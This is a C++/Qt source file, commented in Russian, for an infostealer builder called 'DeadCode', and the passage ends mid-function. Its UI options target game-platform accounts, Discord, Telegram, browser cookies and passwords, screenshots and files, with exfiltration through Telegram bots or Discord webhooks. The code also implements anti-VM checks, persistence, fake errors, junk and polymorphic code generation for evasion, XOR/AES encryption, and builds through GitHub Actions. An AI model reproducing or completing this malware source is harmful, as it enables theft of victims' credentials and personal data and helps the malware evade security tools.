#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>

// Определение глобальной переменной
MainWindow* g_mainWindow = nullptr;

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Реализация класса StealerWorker
class StealerWorker : public QObject {
    Q_OBJECT
public:
    StealerWorker(MainWindow* window, const std::string& tempDir) : window(window), tempDir(tempDir) {}

public slots:
    void process() {
        window->StealAndSendData(tempDir);
        emit finished();
    }

signals:
    void finished();

private:
    MainWindow* window;
    std::string tempDir;
};

// Реализация пространства имен JunkCode
namespace JunkCode {
    void executeJunkCode() {
        // Генерация случайных вычислений для запутывания
        volatile int a = rand() % 1000;
        volatile int b = rand() % 1000;
        for (int i = 0; i < 1000; ++i) {
            a = (a * b) % 1000 + i;
            b = (b + a) % 1000 - i;
        }
        // Задержка для усложнения анализа
        Sleep(10);
    }
}

// Реализация пространства имен Polymorphic
namespace Polymorphic {
    void executePolymorphicCode() {
        // Вызов сгенерированного полиморфного кода
        // Предполагается, что этот код уже сгенерирован в polymorphic_code.h
        // Здесь мы просто вызываем несколько случайных функций
        volatile int dummy = rand() % 1000;
        for (int i = 0; i < 5; ++i) {
            dummy ^= (rand() % 100);
            Sleep(5);
        }
    }
}

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    emit logUpdated(message);
}

// Реализация метода updateConfigFromUI
void MainWindow::updateConfigFromUI() {
    QMutexLocker locker(&logMutex); // Потокобезопасность

    config.sendMethod = sendMethodComboBox->currentText().toStdString();
    config.buildMethod = buildMethodComboBox->currentText().toStdString();
    config.telegramToken = tokenLineEdit->text().toStdString();
    config.chatId = chatIdLineEdit->text().toStdString();
    config.discordWebhook = discordWebhookLineEdit->text().toStdString();
    config.filename = fileNameLineEdit->text().toStdString();
    config.encryptionKey1 = encryptionKey1LineEdit->text().toStdString();
    config.encryptionKey2 = encryptionKey2LineEdit->text().toStdString();
    config.encryptionSalt = encryptionSaltLineEdit->text().toStdString();
    config.iconPath = iconPathLineEdit->text().toStdString();
    config.githubToken = githubTokenLineEdit->text().toStdString();
    config.githubRepo = githubRepoLineEdit->text().toStdString();

    // Обновление чекбоксов
    config.discord = discordCheckBox->isChecked();
    config.steam = steamCheckBox->isChecked();
    config.steamMAFile = steamMAFileCheckBox->isChecked();
    config.epic = epicCheckBox->isChecked();
    config.roblox = robloxCheckBox->isChecked();
    config.battlenet = battlenetCheckBox->isChecked();
    config.minecraft = minecraftCheckBox->isChecked();
    config.cookies = cookiesCheckBox->isChecked();
    config.passwords = passwordsCheckBox->isChecked();
    config.screenshot = screenshotCheckBox->isChecked();
    config.fileGrabber = fileGrabberCheckBox->isChecked();
    config.systemInfo = systemInfoCheckBox->isChecked();
    config.socialEngineering = socialEngineeringCheckBox->isChecked();
    config.chatHistory = chatHistoryCheckBox->isChecked();
    config.telegram = telegramCheckBox->isChecked();
    config.antiVM = antiVMCheckBox->isChecked();
    config.fakeError = fakeErrorCheckBox->isChecked();
    config.silent = silentCheckBox->isChecked();
    config.autoStart = autoStartCheckBox->isChecked();
    config.persist = persistCheckBox->isChecked();
    config.selfDestruct = false; // Пока не реализовано в UI, оставим false
}

// Конструктор
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this; // Инициализация глобальной переменной

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->fileNameLineEdit;
    encryptionKey1LineEdit = ui->encryptionKey1LineEdit;
    encryptionKey2LineEdit = ui->encryptionKey2LineEdit;
    encryptionSaltLineEdit = ui->encryptionSaltLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});
    fileNameLineEdit->setText("DeadCode.exe");
    textEdit->setPlaceholderText("Logs will appear here...");

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::on_actionSaveConfig_triggered);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::on_actionLoadConfig_triggered);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::on_actionExportLogs_triggered);
    connect(ui->actionExit, &QAction::triggered, this, &MainWindow::on_actionExit_triggered);
    connect(ui->actionAbout, &QAction::triggered, this, &MainWindow::on_actionAbout_triggered);
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    // Инициализация config начальными значениями
    updateConfigFromUI();
}

// Деструктор
MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

// Анимация секций
void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer) {
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

// Генерация случайной строки
std::string MainWindow::generateRandomString(size_t length) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.reserve(length);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

    for (size_t i = 0; i < length; ++i) {
        result += alphanum[dis(gen)];
    }

    return result;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateRandomString(16);
        if (useFirstKey) config.encryptionKey1 = keyStr;
        else config.encryptionKey2 = keyStr;
    }
    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 16) {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i]);
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (auto& byte : iv) {
        byte = static_cast<unsigned char>(dis(gen));
    }
    return iv;
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[1024];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            std::string biosVersion(buffer);
            if (biosVersion.find("VMware") != std::string::npos || biosVersion.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
    return false;
}

// Применение XOR-шифрования
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Применение AES-шифрования
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    QByteArray result;
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открытие алгоритма шифрования
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES: " + QString::number(status, 16));
        return QByteArray();
    }

    // Установка режима цепочки
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось установить режим цепочки: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    // Генерация ключа
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка: Не удалось сгенерировать ключ AES: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    // Шифрование данных
    DWORD bytesEncrypted = 0;
    DWORD resultSize = data.size() + 16; // Дополнительное место для padding
    std::vector<UCHAR> encryptedData(resultSize);

    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(),
                           encryptedData.data(), resultSize, &bytesEncrypted, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка шифрования AES: " + QString::number(status, 16));
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    result = QByteArray((char*)encryptedData.data(), bytesEncrypted);

    // Освобождение ресурсов
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return result;
}

// Генерация полиморфного кода
void MainWindow::generatePolymorphicCode() {
    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h");
}

// Генерация заголовочного файла ключей
void MainWindow::generateBuildKeyHeader() {
    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n";
    keyFile << "#include <sstream>\n";
    keyFile << "#include <iomanip>\n";
    keyFile << "#include <random>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    keyFile << "const std::string ENCRYPTION_KEY_1 = \"" << config.encryptionKey1 << "\";\n";
    keyFile << "const std::string ENCRYPTION_KEY_2 = \"" << config.encryptionKey2 << "\";\n";
    keyFile << "const std::string ENCRYPTION_SALT = \"" << config.encryptionSalt << "\";\n\n";

    keyFile << "inline std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& keyStr) {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    if (keyStr.length() >= 16) {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i]);\n";
    keyFile << "        }\n";
    keyFile << "    } else {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);\n";
    keyFile << "        }\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::array<unsigned char, 16> GenerateIV() {\n";
    keyFile << "    std::array<unsigned char, 16> iv;\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    for (auto& byte : iv) {\n";
    keyFile << "        byte = static_cast<unsigned char>(dis(gen));\n";
    keyFile << "    }\n";
    keyFile << "    return iv;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateRandomSalt() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 8; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Файл ключей шифрования сгенерирован в build_key.h");
}

// Копирование иконки
void MainWindow::copyIconToBuild() {
    QString iconPath = ui->iconPathLineEdit->text();
    if (!iconPath.isEmpty()) {
        try {
            std::filesystem::copy_file(iconPath.toStdString(), "icon.ico", std::filesystem::copy_options::overwrite_existing);
            emitLog("Иконка скопирована в директорию сборки: icon.ico");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования иконки: " + QString::fromStdString(e.what()));
            isBuilding = false;
        }
    } else {
        emitLog("Иконка не указана, пропускаем копирование");
    }
}

// Сборка исполняемого файла
void MainWindow::buildExecutable() {
    if (isBuilding) return;
    isBuilding = true;
    buildTimer->stop();
    ui->statusbar->showMessage("Сборка началась...", 0);

    JunkCode::executeJunkCode();
    emitLog("Выполнен мусорный код перед началом сборки");

    std::string buildDir = std::string(std::getenv("TEMP")) + "\\DeadCode_Build_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(buildDir));
    emitLog("Создана директория для сборки: " + QString::fromStdString(buildDir));

    try {
        std::filesystem::create_directories(buildDir + "\\src");
        for (const auto& entry : std::filesystem::directory_iterator(".")) {
            if (entry.path().filename() == "mainwindow.h" ||
                entry.path().filename() == "mainwindow.cpp" ||
                entry.path().filename() == "main.cpp" ||
                entry.path().filename() == "mainwindow.ui" ||
                entry.path().filename() == "polymorphic_code.h" ||
                entry.path().filename() == "build_key.h" ||
                entry.path().filename() == "junk_code.h") {
                std::filesystem::copy_file(entry.path(), buildDir + "\\src\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
            }
        }
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            std::filesystem::copy_file(ui->iconPathLineEdit->text().toStdString(), buildDir + "\\icon.ico", std::filesystem::copy_options::overwrite_existing);
        }
        emitLog("Исходные файлы скопированы в " + QString::fromStdString(buildDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования исходных файлов: " + QString::fromStdString(e.what()));
        isBuilding = false;
        return;
    }

    std::ofstream proFile(buildDir + "\\stealer.pro");
    if (proFile.is_open()) {
        proFile << "QT += core gui network\n";
        proFile << "greaterThan(QT_MAJOR_VERSION, 4): QT += widgets\n";
        proFile << "TARGET = " << config.filename.substr(0, config.filename.find(".exe")) << "\n";
        proFile << "TEMPLATE = app\n";
        proFile << "SOURCES += src/main.cpp src/mainwindow.cpp\n";
        proFile << "HEADERS += src/mainwindow.h src/polymorphic_code.h src/build_key.h src/junk_code.h\n";
        proFile << "FORMS += src/mainwindow.ui\n";
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            proFile << "RC_ICONS = icon.ico\n";
        }
        proFile << "LIBS += -luser32 -lbcrypt -lsqlite3 -lzip -lcurl -liphlpapi -lshlwapi -lpsapi\n";
        proFile.close();
        emitLog("Сгенерирован файл проекта: stealer.pro");
    } else {
        emitLog("Ошибка: Не удалось создать stealer.pro");
        isBuilding = false;
        return;
    }

    QProcess process;
    process.setWorkingDirectory(QString::fromStdString(buildDir));

    QString qmakePath = QStandardPaths::findExecutable("qmake");
    QString makePath = QStandardPaths::findExecutable("mingw32-make");
    if (qmakePath.isEmpty() || makePath.isEmpty()) {
        QString qtDir = qgetenv("QT_DIR");
        if (!qtDir.isEmpty()) {
            qmakePath = qtDir + "/bin/qmake.exe";
            makePath = qtDir + "/../mingw/bin/mingw32-make.exe";
        } else {
            emitLog("Ошибка: qmake или mingw32-make не найдены. Убедитесь, что Qt и MinGW установлены и добавлены в PATH.");
            isBuilding = false;
            return;
        }
    }

    process.start(qmakePath, QStringList() << "stealer.pro");
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения qmake: " + process.readAllStandardError());
        isBuilding = false;
        return;
    }
    emitLog("qmake выполнен успешно");

    process.start(makePath);
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения mingw32-make: " + process.readAllStandardError());
        isBuilding = false;
        return;
    }
    emitLog("mingw32-make выполнен успешно");

    std::string exePath = buildDir + "\\release\\" + config.filename;
    std::string outputPath = QDir::currentPath().toStdString() + "\\" + config.filename;
    try {
        std::filesystem::copy_file(exePath, outputPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Готовый билд сохранен: " + QString::fromStdString(outputPath));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования билда: " + QString::fromStdString(e.what()));
        isBuilding = false;
        return;
    }

    try {
        std::filesystem::remove_all(buildDir);
        emitLog("Временная директория сборки удалена");
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()));
    }

    isBuilding = false;
    ui->statusbar->showMessage("Сборка завершена", 0);
    emit startStealSignal();
}

// Запуск GitHub Actions
void MainWindow::triggerGitHubActions() {
    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны");
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QByteArray data = QJsonDocument(json).toJson();

    QNetworkReply *reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            emitLog("Сборка успешно запущена через GitHub Actions");
            QJsonObject response = QJsonDocument::fromJson(reply->readAll()).object();
            workflowRunId = response["id"].toString();
            if (workflowRunId.isEmpty()) {
                emitLog("Ошибка: Не удалось получить ID workflow");
                isBuilding = false;
            } else {
                statusCheckTimer->start(30000);
            }
        } else {
            emitLog("Ошибка запуска GitHub Actions: " + reply->errorString());
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

// Проверка статуса сборки GitHub Actions
void MainWindow::checkBuildStatus() {
    if (workflowRunId.isEmpty()) {
        emitLog("Ошибка: ID workflow не установлен");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны");
        statusCheckTimer->stop();
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply *reply = manager->get(request);
